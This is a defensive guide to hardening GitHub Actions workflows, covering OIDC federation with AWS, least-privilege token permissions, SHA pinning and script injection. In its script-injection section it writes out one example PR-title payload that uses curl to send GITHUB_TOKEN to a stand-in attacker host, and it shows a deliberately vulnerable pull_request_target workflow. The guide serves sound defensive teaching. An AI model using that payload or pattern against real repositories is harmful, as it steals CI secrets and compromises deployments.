---
description: GitHub Actions security hardening — OIDC federation, least-privilege tokens, secret scanning, and supply chain protection.
---

# GitHub Actions — Security Hardening

```
GHA Security Hardening
├── Threat Model
│   └── Attacker modifies workflow or injects commands → access to secrets + deployment targets
├── OIDC Federation
│   ├── 4-step flow: job starts → GitHub OIDC provider → JWT → cloud IAM → short-lived token
│   ├── AWS setup: Terraform OIDC provider + IAM role with Condition (sub + aud)
│   ├── Workflow: permissions id-token: write + configure-aws-credentials action
│   └── Scoping: sub claim → repo:org/repo:ref / environment / job_workflow_ref
├── Least-Privilege Token Permissions
│   ├── permissions: {} — disable all GITHUB_TOKEN scopes at workflow level
│   ├── Per-job permissions — grant only what that job needs
│   ├── contents: read — read repo; packages: write — push to GHCR
│   └── id-token: write — required for OIDC token request
├── Action Pinning (Supply Chain)
│   ├── Dangerous: uses: actions/checkout@v4 (mutable tag)
│   ├── Safe: uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
│   └── Tool: zizmor — static analyzer (pip install zizmor && zizmor .github/workflows/)
├── Script Injection Prevention
│   ├── VULNERABLE: run: echo "${{ github.event.pull_request.title }}"
│   ├── SAFE: env: PR_TITLE: ${{ ... }} then echo "$PR_TITLE"
│   └── Rule: never interpolate untrusted context directly in run: commands
└── pull_request_target Danger
    ├── Runs with base repo permissions (has access to secrets)
    ├── DANGEROUS: checkout the PR head + run PR code with base permissions
    └── SAFE: never checkout untrusted PR code in pull_request_target
```

## First Principles

- The threat model for GitHub Actions is: every `run:` step is arbitrary code execution on a runner. The runner has network access, has access to secrets in env, and can make API calls using GITHUB_TOKEN. Any input to a `run:` step that an attacker can control is a code injection vector.
- OIDC solves the "secret zero" problem. To authenticate to AWS with a static credential, you first need... a credential. OIDC establishes trust through configuration (IAM trust policy), not through a shared secret. The JWT is the proof of identity, verified cryptographically.
- SHA pinning prevents supply chain attacks where an action maintainer (or attacker who compromises the maintainer) updates a mutable tag to point to malicious code. A SHA is the content hash — it cannot point to different content than what you audited.
- `permissions: {}` disables all GITHUB_TOKEN scopes as a starting point. Incrementally adding only what's needed forces explicit thought about what each job actually requires. Default `GITHUB_TOKEN` is `write` for most scopes — a massive over-grant.
- `pull_request_target` runs with the base repo's full permissions. This is intentional — it allows commenting on PRs and accessing secrets for external PRs. The danger: if you also checkout and run the PR's code in this context, that PR code executes with base repo secrets. Separate the trust boundary: comment/label in `pull_request_target`, run actual CI in `pull_request` (no secrets, sandboxed).

## The Core Threat Model

Every workflow runs arbitrary code on a runner. If an attacker can modify a workflow or inject commands, they gain access to your secrets and deployment targets.

> **Senior Mindset:** Treat every 3rd-party Action as a potential supply chain attack vector. Pin everything. Grant minimum permissions.

***

## OIDC — Eliminating Long-Lived Secrets

### The Problem with Static Credentials
Storing `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` as GitHub secrets means:
- A single secret leak = full cloud access until manually rotated
- Rotation is manual and error-prone
- No audit trail per-workflow

### OIDC Architecture

```
GitHub Actions Runner
        │
        │ 1. Request OIDC token (JWT)
        ▼
GitHub OIDC Provider (tokens.actions.githubusercontent.com)
        │
        │ 2. Return short-lived JWT (ttl: 1 hour)
        ▼
GitHub Actions Step
        │
        │ 3. Exchange JWT for cloud credentials
        ▼
AWS STS / Azure AD / GCP STS
        │
        │ 4. Return temporary credentials (15 min)
        ▼
Workflow continues with scoped access
```

### AWS OIDC Setup

**Step 1 — Create the OIDC Provider in AWS:**
```bash
# Terraform example
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}
```

**Step 2 — Create a Role with a Trust Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:MY_ORG/MY_REPO:*"
      }
    }
  }]
}
```

**Step 3 — Use in Workflow (zero static secrets):**
```yaml
permissions:
  id-token: write   # REQUIRED for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-actions-deploy
          aws-region: us-east-1
      
      - run: aws s3 cp dist/ s3://my-bucket/ --recursive
```

***

## Least-Privilege Token Permissions

The `GITHUB_TOKEN` auto-generated for each job has configurable scopes. Default is often too broad.

```yaml
# Global default — deny everything
permissions: {}   # or: read-all

jobs:
  build:
    permissions:
      contents: read          # Only read source code
      packages: write         # Push to GitHub Container Registry
      security-events: write  # Upload SARIF results

  release:
    permissions:
      contents: write         # Create a release
      id-token: write         # OIDC
```

***

## Pinning Actions to Commit SHAs

```yaml
# DANGEROUS — tag can be moved or deleted
- uses: actions/checkout@v4

# SAFE — commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Tooling:** Use `tj-actions/changed-files` pinned version manager or `Dependabot` for Actions to auto-PR SHA updates.

***

## Preventing Script Injection

**VULNERABLE — user-controlled data injected into shell:**
```yaml
# PR title is attacker-controlled
- run: echo "${{ github.event.pull_request.title }}"
```

An attacker sets PR title to: `"; curl attacker.com/exfil?t=$GITHUB_TOKEN #`

**SAFE — pass via environment variable:**
```yaml
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"    # Shell cannot interpret $PR_TITLE as commands
```

***

## `pull_request_target` — The Dangerous Event

`pull_request_target` runs in the context of the **base branch** and has access to secrets. Combining it with `actions/checkout` to check out the fork's code is a known RCE vulnerability.

```yaml
# DANGEROUS PATTERN
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← Checks out fork's code WITH secrets
      - run: ./ci/test.sh   # Attacker controls this file!
```

**Safe Pattern:** Run untrusted code in a job with `permissions: {}` and no secrets access, then pass results to a privileged job.

***

## Logic & Trickiness Table

| Risk | Common Mistake | Hardened Approach |
|:---|:---|:---|
| **Supply chain** | `uses: action@v2` tag | Pin to commit SHA |
| **Secret sprawl** | Static cloud creds in secrets | OIDC federation |
| **Overprivileged token** | Default `GITHUB_TOKEN` scope | Explicit `permissions:` block |
| **Script injection** | `echo "${{ github.event.* }}"` | Use env vars, never inline |
| **Fork PRs** | `pull_request_target` + checkout | Separate jobs by trust level |

## System Design Perspective

**Pipeline scalability:**
- Security controls scale differently from feature code. OIDC trust policies are configured once in the cloud provider — all workflows benefit. SHA pinning is a per-action per-workflow concern — use Dependabot or Renovate to automate updates to the latest pinned SHA.
- `zizmor` as a CI step on the platform's own workflows creates a feedback loop: every workflow change is security-scanned before merging. Run `zizmor .github/workflows/` in a required check on the platform workflows repo.

**Runner architecture and security boundaries:**
- GitHub-hosted runners are isolated VMs. Each job gets a completely fresh VM — no shared filesystem, no shared memory, no leftover credentials from other jobs or repos. This is the default security model.
- Self-hosted runners break this model by default: if they're persistent (not ephemeral), a previous job's secrets can persist in the filesystem. Ephemeral ARC runners (ephemeral: true) restore the VM-fresh guarantee.
- Runner groups with "Only allow specific repositories" setting is a network-level access control. A repository not in the allowed list cannot dispatch jobs to that runner group — enforced at GitHub API level, not just YAML convention.

**Failure recovery and incident response:**
- When a secret is exposed in logs: (1) immediately rotate the secret, (2) audit access logs for the exposure window, (3) fix the code to use env var pattern, (4) add `add-mask` for dynamic secrets. The order matters — rotation first, forensics second.
- When a `pull_request_target` workflow is found to be dangerous: disable the workflow immediately, audit all PRs that triggered it for potential exfiltration, then redesign with trust separation (untrusted code in `pull_request`, labeled/approved PRs in `pull_request_target`).

**Caching and OIDC:**
- OIDC tokens are per-job and short-lived (typically 60 seconds for the token request, role session configurable). For jobs that take >1 hour, set `role-duration-seconds` on `configure-aws-credentials`. The token itself expires after 60 seconds, but the role session lives for `role-duration-seconds`.
- Caches are not a security boundary. A malicious pull request can read cache entries from the `main` branch. Never store secrets in the cache. Use OIDC and secrets store for sensitive values.

**Security boundaries in depth:**
- `permissions: {}` at the workflow level + explicit per-job grants is the minimum viable security posture. If a workflow doesn't define any `permissions`, it inherits the default from the repository settings (usually `write` for most scopes — insecure).
- OIDC scoping via `job_workflow_ref` is stricter than `sub` alone. `sub = repo:org/repo:ref:refs/heads/main` allows any job in the repo on main branch to assume the role. `job_workflow_ref = org/repo/.github/workflows/deploy.yml@refs/heads/main` restricts it to only the deploy workflow — a compromised test workflow cannot escalate to production credentials.
